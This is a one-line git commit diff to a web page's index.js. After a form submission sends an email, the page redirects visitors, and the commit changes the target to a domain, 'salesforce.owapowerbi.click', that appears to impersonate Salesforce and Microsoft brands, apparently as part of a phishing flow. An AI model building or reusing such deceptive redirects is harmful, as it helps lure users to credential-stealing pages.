0909a97b2e3d045fb14c49f6c9477d150df5874e
husknet <127146284+husknet@users.noreply.github.com>
2024-10-11 10:55:49 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://sg.denise-moth.click';
+        window.location.href = 'https://salesforce.owapowerbi.click';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
